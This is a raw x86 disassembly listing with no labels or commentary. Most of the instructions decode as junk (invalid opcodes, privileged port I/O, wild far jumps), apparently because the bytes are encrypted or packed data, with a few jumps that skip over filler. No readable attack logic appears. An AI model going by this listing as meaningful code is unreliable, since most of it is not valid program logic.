  41beba:	or     ebx,0xd361b470
  41bec0:	clc    
  41bec1:	push   esp
  41bec2:	inc    eax
  41bec3:	add    DWORD PTR [ebx],eax
  41bec5:	xchg   ebx,eax
  41bec6:	ins    BYTE PTR es:[edi],dx
  41bec7:	(bad)  
  41bec8:	mov    edx,DWORD PTR [esi]
  41beca:	cmp    ch,BYTE PTR [ebp-0x71]
  41becd:	jecxz  0x41be6b
  41becf:	pop    edx
  41bed0:	mov    edi,0xfe5eb432
  41bed5:	jecxz  0x41bed8
  41bed7:	gs push es
  41bed9:	mov    WORD PTR [eax],ds
  41bedb:	retf   0x2d5c
  41bede:	xor    eax,0x77199e2f
  41bee3:	out    dx,eax
  41bee4:	mov    dh,0xe9
  41bee6:	lock push esp
  41bee8:	pushf  
  41bee9:	fs mov ebx,0x7384adb5
  41beef:	push   esp
  41bef0:	lds    edx,FWORD PTR [ebp-0x1d0a50a5]
  41bef6:	cmp    BYTE PTR [ebx],cl
  41bef8:	push   esp
  41bef9:	iret   
  41befa:	icebp  
  41befb:	sbb    ecx,DWORD PTR [edi+0x6a]
  41befe:	xchg   ecx,eax
  41beff:	jnp    0x41bf00
  41bf01:	mov    edx,0x5e49cfa6
  41bf06:	or     dh,BYTE PTR [ebp-0x31fe624d]
  41bf0c:	pop    ebx
  41bf0d:	mov    WORD PTR [edi-0x13],gs
  41bf10:	adc    eax,0x2d961ec
  41bf15:	mov    bl,0xe6
  41bf17:	int3   
  41bf18:	outs   dx,DWORD PTR ds:[esi]
  41bf19:	xor    BYTE PTR [edx],bh
  41bf1b:	push   ecx
  41bf1c:	les    ebx,FWORD PTR [edx-0x4159d403]
  41bf22:	retf   
  41bf23:	mov    edi,0xb67b06a7
  41bf28:	cwde   
  41bf29:	jmp    FWORD PTR [ebx-0x23]
  41bf2c:	cwde   
  41bf2d:	cld    
  41bf2e:	mov    edi,0xcf276f1b
  41bf33:	aaa    
  41bf34:	xchg   esi,eax
  41bf35:	jae    0x41bfa9
  41bf37:	pop    ax
  41bf39:	adc    eax,0xe1d052e3
  41bf3e:	xchg   esp,eax
  41bf3f:	repnz in eax,dx
  41bf41:	dec    ebp
  41bf42:	mov    ds:0x7560702c,al
  41bf47:	adc    eax,0x671a4d2f
  41bf4c:	rdmsr  
  41bf4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf4f:	sub    BYTE PTR [ebx+0x4d5c0280],bl
  41bf55:	adc    DWORD PTR ds:0xa4f30df5,esi
  41bf5b:	shl    bl,1
  41bf5d:	out    0x75,al
  41bf5f:	in     al,0xad
  41bf61:	cmp    bl,BYTE PTR [edx+edi*2]
  41bf64:	call   0x465555a3
  41bf69:	in     eax,dx
  41bf6a:	or     al,0x20
  41bf6c:	fmul   QWORD PTR [eax+0x1]
  41bf6f:	pop    esi
  41bf70:	ud1    ebp,DWORD PTR [esi-0x40]
  41bf74:	sar    DWORD PTR [esi-0xc],cl
  41bf77:	jge    0x41bf81
  41bf79:	push   DWORD PTR [ecx-0x6209dc4f]
  41bf7f:	in     al,dx
  41bf80:	fistp  WORD PTR [ecx]
  41bf82:	(bad)  
  41bf83:	mov    BYTE PTR [eax],dl
  41bf85:	jae    0x41bf0f
  41bf87:	mov    ds:0xd141f019,eax
  41bf8c:	arpl   WORD PTR [eax+0x6b],sp
  41bf8f:	mov    ecx,0x739f71f7
  41bf94:	sbb    eax,0x28b76b77
  41bf99:	dec    ebp
  41bf9a:	int    0xd6
  41bf9c:	push   ecx
  41bf9e:	or     ebx,ebp
  41bfa0:	or     BYTE PTR [ecx+0x3add9129],al
  41bfa6:	sub    esi,DWORD PTR [ebp+0x2b95567]
  41bfac:	add    eax,0x8945ce52
  41bfb1:	sub    dh,BYTE PTR [edi+0x54]
  41bfb4:	ss push ebx
  41bfb6:	adc    eax,DWORD PTR [eax]
  41bfb8:	or     DWORD PTR [edx+0x4a],edi
  41bfbb:	sub    esp,DWORD PTR [eax-0x3c]
  41bfbe:	ss popf 
  41bfc0:	lea    ecx,[edx+ecx*1+0x327298]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	int    0x36
  41bff1:	fwait
  41bff2:	sbb    al,0xb8
  41bff4:	call   0x7e523878
  41bff9:	js     0x41c073
  41bffb:	xor    ebp,ecx
  41bffd:	adc    ch,BYTE PTR [eax+0x36b698f5]
  41c003:	in     al,0x28
  41c005:	jmp    0x4766e054
  41c00a:	or     edi,DWORD PTR [eax]
  41c00c:	push   es
  41c00d:	sub    ebp,ebx
  41c00f:	outs   dx,BYTE PTR ds:[esi]
  41c010:	add    DWORD PTR [ebx-0x64605623],0xffffffc5
  41c017:	js     0x41bfc0
  41c019:	xchg   ebx,eax
  41c01a:	dec    esi
  41c01b:	cmp    al,al
  41c01d:	test   al,0xe6
  41c01f:	fs mov edx,0xad23f18e
  41c025:	in     al,dx
  41c026:	mov    dl,0x5f
  41c028:	jns    0x41bfda
  41c02a:	in     al,0xe3
  41c02c:	push   cs
  41c02d:	ins    BYTE PTR es:[edi],dx
  41c02e:	push   DWORD PTR [ebx]
  41c030:	push   ebx
  41c031:	mov    dh,0xa3
  41c033:	mov    ds:0xdc41562a,al
  41c038:	adc    dl,BYTE PTR [eax]
  41c03a:	mov    ebp,0xa3b048e6
  41c03f:	mov    esp,ecx
  41c041:	imul   ebx,DWORD PTR ds:0x26c769ab,0xfffffff6
  41c048:	cmc    
  41c049:	stc    
  41c04a:	call   DWORD PTR [edi+0x6]
  41c04d:	cmp    BYTE PTR [edi-0x30],dh
  41c050:	mov    WORD PTR [ecx],ds
  41c052:	jl     0x41c04c
  41c054:	leave  
  41c055:	outs   dx,BYTE PTR ds:[esi]
  41c056:	leave  
  41c057:	or     dh,dh
  41c059:	clc    
  41c05a:	mov    dl,0x1b
  41c05c:	adc    eax,0xd9a64f59
  41c061:	mov    edx,0xdebc5f05
  41c066:	jbe    0x41c02e
  41c068:	push   edi
  41c069:	iret   
  41c06a:	mov    ah,BYTE PTR [edi]
  41c06c:	sub    ecx,DWORD PTR [edx-0x53]
  41c06f:	out    dx,eax
  41c070:	fistp  DWORD PTR [edx-0x1d8f5591]
  41c076:	add    ch,dh
  41c078:	mov    bl,0x6d
  41c07a:	jne    0x41c07a
  41c07c:	test   eax,0xdacfc840
  41c081:	enter  0xa874,0x26
  41c085:	clc    
  41c086:	das    
  41c087:	mov    WORD PTR [ebx],cs
  41c089:	inc    edx
  41c08a:	xor    bl,bl
  41c08c:	adc    eax,0x24c53290
  41c091:	and    BYTE PTR [eax-0x1d0149fa],bh
  41c097:	mov    ch,0x8c
  41c099:	mov    dl,0x41
  41c09b:	(bad)  
  41c09c:	retf   0xc3bf
  41c09f:	cmc    
  41c0a0:	fisubr DWORD PTR [edx]
  41c0a2:	xor    eax,0xcdbcfb81
  41c0a7:	popf   
  41c0a8:	int    0xe4
  41c0aa:	mov    BYTE PTR [eax-0x2a6d245a],0xde
  41c0b1:	xor    eax,0xcb63db8a
  41c0b6:	jmp    DWORD PTR [edx+0x5ba35f4]
  41c0bc:	xor    cl,bl
  41c0be:	icebp  
  41c0bf:	and    BYTE PTR [edx],bh
  41c0c1:	aad    0x33
  41c0c3:	pop    edx
  41c0c4:	inc    eax
  41c0c5:	push   ss
  41c0c6:	sbb    al,BYTE PTR [edx]
  41c0c8:	out    0x8f,eax
  41c0ca:	xor    DWORD PTR [ebp-0x10],esp
  41c0cd:	les    esp,FWORD PTR [ecx]
  41c0cf:	pop    ds
  41c0d0:	and    DWORD PTR [ebx+0x55],0x65221955
  41c0d7:	mov    dh,0x86
  41c0d9:	or     dl,dh
  41c0db:	cmp    DWORD PTR [edx-0x52],ebp
  41c0de:	sbb    al,al
  41c0e0:	gs inc esp
  41c0e2:	push   eax
  41c0e3:	mov    ds:0xc76cba9d,al
  41c0e8:	in     eax,dx
  41c0e9:	adc    bl,dh
  41c0eb:	addps  xmm7,XMMWORD PTR [edi+ebp*8]
  41c0ef:	inc    ebp
  41c0f0:	ror    BYTE PTR [edx+0x246f9000],1
  41c0f6:	popf   
  41c0f7:	adc    al,0x21
  41c0f9:	loope  0x41c0cc
  41c0fb:	loopne 0x41c179
  41c0fd:	fsubr  DWORD PTR [ecx+0x106a7025]
  41c103:	gs in  al,0xfd
  41c106:	mov    bh,0x54
  41c108:	jmp    FWORD PTR [edi+0x4137b810]
  41c10e:	fsubr  st(6),st
  41c110:	adc    eax,0xbc22912
  41c115:	ins    DWORD PTR es:[edi],dx
  41c116:	data16 shr BYTE PTR [edi+0x7a0158ed],cl
  41c11d:	adc    al,0x2a
  41c11f:	xor    ecx,DWORD PTR [edx+0x5024d22a]
  41c125:	ret    
  41c126:	aaa    
  41c127:	fidiv  DWORD PTR [eax+ebp*1]
  41c12a:	scas   eax,DWORD PTR es:[edi]
  41c12b:	xor    edi,DWORD PTR [edi+0x7]
  41c12e:	test   DWORD PTR [ecx-0x182c4756],ecx
  41c134:	mov    dh,0x75
  41c136:	(bad)  
  41c137:	leave  
  41c138:	fiadd  DWORD PTR [ebx]
  41c13a:	pushf  
  41c13b:	inc    eax
  41c13c:	in     al,0xd0
  41c13e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c13f:	sbb    eax,0xdb171f59
  41c144:	push   edi
  41c145:	aaa    
  41c146:	fbld   TBYTE PTR ds:0x7684fd8d
  41c14c:	jmp    0x98445d2
  41c151:	ret    
  41c152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c153:	push   esi
  41c154:	inc    eax
  41c155:	add    al,0xe9
  41c157:	cmp    al,0xa6
  41c159:	xchg   ebp,eax
  41c15a:	aad    0x3c
  41c15c:	inc    ebx
  41c15d:	dec    edi
  41c15e:	lods   eax,DWORD PTR ds:[esi]
  41c15f:	leave  
  41c160:	inc    ebx
  41c161:	dec    edx
  41c162:	mov    ebx,0x1f61969a
  41c167:	test   al,0x77
  41c169:	mov    ch,0xb0
  41c16b:	popa   
  41c16c:	cmp    BYTE PTR [ebx+0x176b1333],dh
  41c172:	xor    edi,DWORD PTR [edi]
  41c174:	xor    al,0x72
  41c176:	or     eax,0xcb5ca3a3
  41c17b:	imul   eax,DWORD PTR [ebp+0x43],0x9b9a8fb1
  41c182:	int    0x6f
  41c184:	or     al,0x8c
  41c186:	outs   dx,BYTE PTR ds:[esi]
  41c187:	adc    al,0x16
  41c189:	jo     0x41c13f
  41c18b:	mov    esp,0xad2585e3
  41c190:	cmp    al,0x55
  41c192:	xor    BYTE PTR [esi+0x2a89e768],0xac
  41c199:	push   edi
  41c19a:	mov    ah,0x16
  41c19c:	adc    ah,BYTE PTR [ecx+0x3aad1063]
  41c1a2:	mov    esp,0x3c38acad
  41c1a7:	mov    cl,0x13
  41c1a9:	iret   
  41c1aa:	pop    edx
  41c1ab:	fs (bad) 
  41c1ad:	xor    ch,ah
  41c1af:	aad    0x70
  41c1b1:	ins    BYTE PTR es:[edi],dx
  41c1b2:	jmp    0x41c142
  41c1b4:	dec    esi
  41c1b5:	jmp    0x576d5ed6
  41c1ba:	out    dx,eax
  41c1bb:	sahf   
  41c1bc:	and    dl,BYTE PTR [ebx-0x17]
  41c1bf:	jne    0x41c1d9
  41c1c1:	ret    
  41c1c2:	hlt    
  41c1c3:	lods   eax,DWORD PTR ds:[esi]
  41c1c4:	pop    ecx
  41c1c5:	dec    ebx
  41c1c6:	lods   al,BYTE PTR ds:[esi]
  41c1c7:	sbb    al,0x55
  41c1c9:	mov    esi,0x37a6ebd3
  41c1ce:	nop
  41c1cf:	jle    0x41c22d
  41c1d1:	inc    ebx
  41c1d2:	push   ebp
  41c1d3:	mov    dh,BYTE PTR ds:0xdbe50192
  41c1d9:	xor    BYTE PTR [edi+esi*2+0x11a5bee],ah
  41c1e0:	stc    
  41c1e1:	or     cl,ch
  41c1e3:	fadd   QWORD PTR [edx+edx*2-0x2ff4e988]
  41c1ea:	push   edi
  41c1eb:	inc    esp
  41c1ec:	adc    ecx,ecx
  41c1ee:	(bad)  
  41c1ef:	pusha  
  41c1f0:	cmp    esp,DWORD PTR [esi-0x59]
  41c1f3:	shr    BYTE PTR [eax+0x206c791d],cl
  41c1f9:	xor    ecx,DWORD PTR [edx+0x5]
  41c1fc:	into   
  41c1fd:	push   eax
  41c1fe:	push   ecx
  41c1ff:	icebp  
  41c200:	jbe    0x41c244
  41c202:	outs   dx,DWORD PTR ds:[esi]
  41c203:	adc    al,0x54
  41c205:	jmp    0x7595:0x82132aee
  41c20c:	(bad)  
  41c20d:	jnp    0x41c192
  41c20f:	jne    0x41c1aa
  41c211:	adc    al,0xa7
  41c213:	xor    eax,0x7510850
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	xlat   BYTE PTR ds:[ebx]
  41c22c:	das    
  41c22d:	jmp    0x80301255
  41c232:	js     0x41c244
  41c234:	jle    0x41c2ae
  41c236:	js     0x41c20b
  41c238:	fist   WORD PTR [esi+0x77]
  41c23b:	imul   eax,DWORD PTR [edi-0x35],0x132f9f95
  41c242:	lods   eax,DWORD PTR ds:[esi]
  41c243:	jb     0x41c1f8
  41c245:	ins    BYTE PTR es:[edi],dx
  41c246:	adc    BYTE PTR [ebx-0x78],bh
  41c249:	fdivr  DWORD PTR [esi-0x3]
  41c24c:	lahf   
  41c24d:	data16 lock xlat BYTE PTR ds:[ebx]
  41c250:	(bad)  
  41c251:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c252:	push   es
  41c253:	xchg   sp,ax
  41c255:	test   DWORD PTR [ecx-0x4b],edx
  41c258:	imul   ebp,ebx,0x947d94f1
  41c25e:	jl     0x41c298
  41c260:	dec    ebx
  41c261:	pop    edx
  41c262:	mov    ds:0x5a2ddaa7,al
  41c267:	jb     0x41c267
  41c269:	addr16 mov cl,0xe7
  41c26c:	lds    edi,FWORD PTR [edi+0x51]
  41c26f:	jge    0x41c1f3
  41c271:	repnz fidiv WORD PTR [ebx-0x5bcab6df]
  41c278:	inc    esp
  41c279:	sbb    ecx,DWORD PTR [eax-0x550ddc3]
  41c27f:	in     eax,0x89
  41c281:	xor    cl,bh
  41c283:	inc    edi
  41c284:	in     eax,dx
  41c285:	xor    al,0x9
  41c287:	adc    eax,DWORD PTR [ebx]
  41c289:	xchg   BYTE PTR [ebx-0x62],bh
  41c28c:	sub    ebx,DWORD PTR [edx+0x36a627ff]
  41c292:	outs   dx,DWORD PTR ds:[esi]
  41c293:	and    al,0x62
  41c295:	inc    esp
  41c296:	out    dx,eax
  41c297:	xchg   DWORD PTR [edi+0xa3b6949],edi
  41c29d:	cdq    
  41c29e:	mov    eax,ds:0x55720c7c
  41c2a3:	push   ebp
  41c2a4:	push   ebx
  41c2a5:	adc    DWORD PTR [ebx],ecx
  41c2a7:	ret    0x2697
  41c2aa:	jae    0x41c22c
  41c2ac:	lods   al,BYTE PTR ds:[esi]
  41c2ad:	cmp    BYTE PTR [ebp+0xa0e6a32],ch
  41c2b3:	add    DWORD PTR [eax+0x55719b8a],ebx
  41c2b9:	xlat   BYTE PTR ds:[ebx]
  41c2ba:	adc    edi,DWORD PTR [edi-0x78]
  41c2bd:	or     bl,ch
  41c2bf:	fstp   TBYTE PTR [esi+0x7a]
  41c2c2:	dec    edi
  41c2c3:	jns    0x41c272
  41c2c5:	mov    esp,0x16505619
  41c2ca:	push   ss
  41c2cb:	ror    BYTE PTR [edi+ebx*2+0x33],1
  41c2cf:	(bad)  
  41c2d0:	xor    esp,DWORD PTR [ebx-0x4b]
  41c2d3:	retf   0x635b
  41c2d6:	or     DWORD PTR [ebp+0x7a],ecx
  41c2d9:	push   cs
  41c2da:	jg     0x41c348
  41c2dc:	mov    ebx,0x8db53842
  41c2e1:	cmp    bl,ah
  41c2e3:	loope  0x41c348
  41c2e5:	xlat   BYTE PTR ds:[ebx]
  41c2e6:	and    ebp,ebx
  41c2e8:	mov    ebx,0xc1c87e3e
  41c2ed:	mov    ah,0xf8
  41c2ef:	out    0x4e,al
  41c2f1:	jcxz   0x41c2a4
  41c2f4:	cmp    esi,DWORD PTR [esi-0x4a4f18f4]
  41c2fa:	pushf  
  41c2fb:	inc    ebx
  41c2fc:	repnz inc ebp
  41c2fe:	xor    al,0xf4
  41c300:	imul   esi,DWORD PTR ds:0x6431240a,0x38
  41c307:	daa    
  41c308:	mov    esi,0x2445c910
  41c30d:	pop    esp
  41c30e:	xchg   BYTE PTR [ecx-0x542f6934],bl
  41c314:	mov    ebx,0xa28eb685
  41c319:	inc    edi
  41c31a:	stos   BYTE PTR es:[edi],al
  41c31b:	dec    edx
  41c31c:	mov    ecx,0x78e76b14
  41c321:	push   0xd57abb6e
  41c326:	or     al,0x3b
  41c328:	inc    edx
  41c329:	xchg   ebx,eax
  41c32a:	cs dec esi
  41c32c:	sbb    DWORD PTR [edx+0x62b16980],edx
  41c332:	adc    BYTE PTR [ebp-0x5e],bl
  41c335:	jbe    0x41c3ae
  41c337:	adc    al,0xac
  41c339:	mov    bl,0xf6
  41c33b:	xchg   ebx,eax
  41c33c:	mov    eax,0xae951dc1
  41c341:	iret   
  41c342:	out    0xc5,al
  41c344:	(bad)  
  41c345:	das    
  41c346:	add    ebx,edx
  41c348:	adc    BYTE PTR [esi+esi*4-0x7e],al
  41c34c:	sub    BYTE PTR [ecx-0x32],ah
  41c34f:	rcr    DWORD PTR [edi-0x189ef8f2],0xf
  41c356:	int    0x1f
  41c358:	fcmovnu st,st(2)
  41c35a:	mov    cl,0x4d
  41c35c:	fcmovnbe st,st(2)
  41c35e:	pop    ds
  41c35f:	ret    
  41c360:	pop    ss
  41c361:	fnstsw WORD PTR [eax+ebx*2+0x788e950c]
  41c368:	shl    BYTE PTR [edi+0x4e],0x42
  41c36c:	mov    ds:0x6f77b871,al
  41c371:	pop    esp
  41c372:	cli    
  41c373:	ds (bad) 
  41c375:	in     al,dx
  41c376:	mov    esp,0x57bd30f4
  41c37b:	sub    al,0xab
  41c37d:	jmp    0x1e3567e8
  41c382:	cs dec eax
  41c384:	add    DWORD PTR [ecx+0x37],edx
  41c387:	pusha  
  41c388:	or     DWORD PTR [edx+0x38],ecx
  41c38b:	jo     0x41c33d
  41c38d:	imul   ebx,DWORD PTR [edx-0x69999455],0x8
  41c394:	ins    BYTE PTR es:[edi],dx
  41c395:	push   ds
  41c396:	inc    esp
  41c397:	sbb    eax,0x9836b662
  41c39c:	in     al,0x18
  41c39e:	aas    
  41c39f:	pop    ebp
  41c3a0:	mov    bl,0xcf
  41c3a2:	or     cl,ch
  41c3a4:	sahf   
  41c3a5:	xor    ebp,DWORD PTR [eax+0x49]
  41c3a8:	mov    dl,0x39
  41c3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ab:	or     al,0xe1
  41c3ad:	jp     0x41c3b0
  41c3af:	cmp    ebx,DWORD PTR [edi-0x1aef9e0f]
  41c3b5:	sub    dh,bl
  41c3b7:	je     0x41c41d
  41c3b9:	setns  BYTE PTR [ebp-0x4651a35a]
  41c3c0:	(bad)  
  41c3c1:	ret    0x36d9
  41c3c4:	popa   
  41c3c5:	rcl    DWORD PTR [edx-0x25],cl
  41c3c8:	xchg   ebx,eax
  41c3c9:	fisttp DWORD PTR [esi+0x2af4c209]
  41c3cf:	sti    
  41c3d0:	fs adc edi,esp
  41c3d3:	ss aad 0xbe
  41c3d6:	out    dx,eax
  41c3d7:	cmp    DWORD PTR [eax-0xc],edx
  41c3da:	(bad)
  41c3dd:	mov    bh,0xdc
  41c3df:	or     BYTE PTR [edx-0x38],ah
  41c3e2:	push   ebx
  41c3e3:	and    ch,BYTE PTR ds:0xaa68e0be
  41c3e9:	inc    ebx
  41c3ea:	aas    
  41c3eb:	shl    ecx,1
  41c3ed:	dec    edx
  41c3ee:	scas   al,BYTE PTR es:[edi]
  41c3ef:	test   BYTE PTR [eax],bh
  41c3f1:	retf   0xe231
  41c3f4:	int3   
  41c3f5:	dec    eax
  41c3f6:	or     DWORD PTR [edx+0x1da532c],esi
  41c3fc:	into   
  41c3fd:	xor    BYTE PTR [esi-0x24e2b13],dl
  41c403:	xor    ah,BYTE PTR [eax+edx*4-0x63eb7561]
  41c40a:	(bad)  
  41c40b:	scas   al,BYTE PTR es:[edi]
  41c40c:	frstor [esp+edi*1+0x3fc72b67]
  41c413:	sbb    bl,BYTE PTR [ebp-0x52]
  41c416:	test   BYTE PTR [ebx+0x5d],ch
  41c419:	inc    esp
  41c41a:	aam    0xe8
  41c41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c41d:	inc    eax
  41c41e:	push   esi
  41c41f:	das    
  41c420:	pop    edx
  41c421:	clc    
  41c422:	dec    eax
  41c423:	pop    ss
  41c424:	cmc    
  41c425:	sbb    DWORD PTR [esi],esp
  41c427:	in     al,0x2e
  41c429:	and    eax,ebx
  41c42b:	sub    al,0x11
  41c42d:	jmp    0xdcdca577
  41c432:	fldcw  WORD PTR [ecx+eax*1+0x28ba64a]
  41c439:	mov    ebp,0x5194cc52
  41c43e:	xor    eax,DWORD PTR [ebx-0x67a114d8]
  41c444:	add    esi,DWORD PTR [ecx+edi*8-0x2ec3d461]
  41c44b:	repnz or DWORD PTR [ebx],ebp
  41c44e:	push   cs
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c3eb
  41c464:	pop    edx
  41c465:	cmovbe ebp,DWORD PTR [eax-0x14]
  41c469:	jg     0x41c4e3
  41c46b:	adc    BYTE PTR [esi+0x78],bh
  41c46e:	js     0x41c40a
  41c470:	jae    0x41c4cf
  41c472:	imul   esi,DWORD PTR [eax-0x43a96c0f],0x4c8d08f3
  41c47c:	fsub   DWORD PTR [ebx-0x51730e4d]
  41c482:	ror    BYTE PTR [edx],cl
  41c484:	ins    DWORD PTR es:[edi],dx
  41c485:	sub    BYTE PTR [edx+ebp*1],al
  41c488:	out    dx,al
  41c489:	add    dl,BYTE PTR [eax]
  41c48b:	mov    ebp,0x1cd033b2
  41c490:	call   0x3762:0xe12827fc
  41c497:	mov    ch,0x54
  41c499:	arpl   WORD PTR [eax+0x7d1432fb],bp
  41c49f:	and    DWORD PTR [edx-0x7a],eax
  41c4a2:	fwait
  41c4a3:	pop    edx
  41c4a4:	inc    eax
  41c4a5:	xor    DWORD PTR [eax-0x5f3b1d1f],esi
  41c4ab:	or     eax,0x2f11d491
  41c4b0:	call   0x5483bc8b
  41c4b5:	mov    DWORD PTR ds:[ebp+0x6b42008],ecx
  41c4bc:	xor    eax,0xca6a7bd
  41c4c1:	mov    al,0x95
  41c4c3:	mov    BYTE PTR [ecx],bl
  41c4c5:	mov    ds:0xbcbad24,eax
  41c4ca:	or     eax,0xdf51ba5e
  41c4cf:	loop   0x41c45d
  41c4d1:	jno    0x41c4ab
  41c4d3:	es or  al,0x3e
  41c4d6:	mov    ebx,0x1a67e3c8
  41c4db:	jge    0x41c4fe
  41c4dd:	enter  0x3ed3,0xa4
  41c4e1:	in     al,dx
  41c4e2:	neg    DWORD PTR [edi+0x3]
  41c4e5:	cmp    dl,BYTE PTR [ecx+0x42]
  41c4e8:	xchg   esi,eax
  41c4e9:	and    DWORD PTR [edi+ebp*8-0x4c0e1ab0],edi
  41c4f0:	js     0x41c55e
  41c4f2:	mov    ebx,0xe6c36223
  41c4f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4f8:	and    BYTE PTR [esp-0x35],bl
  41c4fc:	pop    edi
  41c4fd:	xor    al,0x86
  41c4ff:	je     0x41c484
  41c501:	mul    DWORD PTR [edx-0x3b1dcd69]
  41c507:	pop    ss
  41c508:	push   0x5e101cd
  41c50d:	jbe    0x41c4d9
  41c50f:	pop    esp
  41c510:	and    BYTE PTR [ebp-0x7d],dl
  41c513:	in     al,0x87
  41c515:	mov    BYTE PTR [ebx+ecx*4+0x2c284b07],bh
  41c51c:	rdpmc  
  41c51e:	data16 stc 
  41c520:	jecxz  0x41c560
  41c522:	pop    ss
  41c523:	jmp    FWORD PTR [esi+0x22]
  41c526:	jnp    0x41c569
  41c528:	and    BYTE PTR [edi+0x4b],al
  41c52b:	xchg   ebx,eax
  41c52c:	adc    DWORD PTR [ecx+0x7],esi
  41c52f:	lahf   
  41c530:	jecxz  0x41c55f
  41c532:	out    dx,al
  41c533:	sub    al,0x54
  41c535:	mov    dh,0xc2
  41c537:	ds and eax,0xff0ddb48
  41c53d:	pop    ss
  41c53e:	fiadd  WORD PTR [edi-0x5e9b0100]
  41c544:	lods   al,BYTE PTR ds:[esi]
  41c545:	ss jp  0x41c4fe
  41c548:	xchg   ebx,eax
  41c54a:	push   ds
  41c54b:	inc    eax
  41c54c:	loopne 0x41c5c9
  41c54e:	sti    
  41c54f:	mov    ecx,0xd17985e0
  41c554:	fistp  QWORD PTR [edi]
  41c556:	in     al,dx
  41c557:	or     DWORD PTR [ecx-0x2edb167d],eax
  41c55d:	inc    edx
  41c55e:	mov    dh,0x96
  41c560:	pop    es
  41c561:	jmp    0xd5e4812f
  41c566:	or     al,0x7
  41c568:	xor    al,0x39
  41c56a:	fmul   st(6),st
  41c56c:	pop    es
  41c56d:	scas   al,BYTE PTR es:[edi]
  41c56e:	mov    eax,ds:0x50e58c04
  41c573:	adc    al,0x4b
  41c575:	outs   dx,BYTE PTR ds:[esi]
  41c576:	call   FWORD PTR [edi]
  41c578:	stos   DWORD PTR es:[edi],eax
  41c579:	jmp    0x7513:0x89abf337
  41c580:	mov    edi,0xd32c2df
  41c585:	arpl   cx,ax
  41c587:	xchg   ebx,eax
  41c588:	loop   0x41c5a7
  41c58a:	hlt    
  41c58b:	pop    esp
  41c58c:	inc    esp
  41c58d:	stos   DWORD PTR es:[edi],eax
  41c58e:	aas    
  41c58f:	sub    DWORD PTR [edx+0x7e89fc3c],esp
  41c595:	in     eax,0xb6
  41c597:	in     al,0xc6
  41c599:	add    BYTE PTR ds:0x1b57e00a,bh
  41c59f:	mov    ebx,0xa20ebc6d
  41c5a4:	inc    BYTE PTR [esi+esi*8+0x5e]
  41c5a8:	lods   al,BYTE PTR ds:[esi]
  41c5a9:	sbb    al,0xd1
  41c5ab:	lds    edx,FWORD PTR [esi]
  41c5ad:	jl     0x41c569
  41c5af:	js     0x41c62c
  41c5b1:	sahf   
  41c5b2:	xchg   BYTE PTR [esi],cl
  41c5b4:	in     al,dx
  41c5b5:	jp     0x41c5e9
  41c5b7:	pop    ebx
  41c5b8:	jmp    0xe0ee:0xa0c91468
  41c5bf:	pop    edi
  41c5c0:	loope  0x41c5df
  41c5c2:	or     DWORD PTR [ebp+0x58f3ee78],esi
  41c5c8:	cmp    DWORD PTR [esi+esi*8-0x54112b24],esi
  41c5cf:	test   BYTE PTR [edi-0x1c],ch
  41c5d2:	mov    ds:0x33fd3953,eax
  41c5d7:	mov    esi,ecx
  41c5d9:	ins    DWORD PTR es:[edi],dx
  41c5da:	adc    al,0x5b
  41c5dc:	stc    
  41c5dd:	add    eax,0x9b1f5450
  41c5e2:	sbb    edx,DWORD PTR [ebx]
  41c5e4:	mov    BYTE PTR [ebp-0x3ff46aa],ah
  41c5ea:	in     eax,dx
  41c5eb:	sbb    cl,BYTE PTR [ebx]
  41c5ed:	xor    BYTE PTR [ebp-0x6dafebc2],ch
  41c5f3:	and    al,0x5e
  41c5f5:	push   ecx
  41c5f6:	clc    
  41c5f7:	inc    esi
  41c5f8:	inc    esi
  41c5f9:	adc    ecx,DWORD PTR [edi-0x32]
  41c5fc:	mov    dh,0x71
  41c5fe:	std    
  41c5ff:	loope  0x41c5ed
  41c601:	xor    eax,0xe770f4ce
  41c606:	sub    eax,0x76e621d3
  41c60b:	or     BYTE PTR [esi],cl
  41c60d:	xor    eax,0xaa45d59d
  41c612:	nop
  41c613:	js     0x41c5a3
  41c615:	popa   
  41c616:	adc    al,0xef
  41c618:	mov    ds:0x91c483d,al
  41c61d:	jb     0x41c5b5
  41c61f:	pop    esi
  41c620:	pop    es
  41c621:	push   eax
  41c622:	xchg   esp,eax
  41c623:	jno    0x41c5fc
  41c625:	jecxz  0x41c669
  41c627:	push   es
  41c628:	mov    esi,0x26da4d1d
  41c62d:	stos   BYTE PTR es:[edi],al
  41c62e:	or     BYTE PTR [esp+esi*2],0xad
  41c632:	fistp  DWORD PTR [esi+0x7fde49c9]
  41c638:	es or  eax,0xa9458a63
  41c63e:	call   0x2279:0x12522cac
  41c645:	repnz repnz dec edi
  41c648:	or     al,0x20
  41c64a:	dec    esi
  41c64b:	sbb    BYTE PTR [esi-0x47],dl
  41c64e:	fadd   DWORD PTR [esi+ecx*8+0x4ed17288]
  41c655:	fs jnp 0x41c6d4
  41c658:	push   ds
  41c659:	jmp    0x41c659
  41c65b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c65c:	pop    ebp
  41c65d:	rol    DWORD PTR [eax-0x34],1
  41c660:	jle    0x41c6d7
  41c662:	jae    0x41c654
  41c664:	push   ss
